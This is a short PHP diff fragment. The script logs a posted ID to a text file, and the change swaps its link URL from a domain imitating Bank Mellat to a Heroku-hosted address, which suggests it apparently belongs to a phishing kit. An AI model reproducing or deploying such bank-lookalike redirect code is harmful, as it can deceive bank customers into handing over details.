@@ -31,7 +31,7 @@ $IDS=intval(stripslashes(htmlspecialchars($_POST["ID"])));
 
 //LINK
 
-$url="https://bank-mellat-shop.ga";
+$url="https://cxds.herokuapp.com";
 
 file_put_contents("ID.txt",$IDS);
  
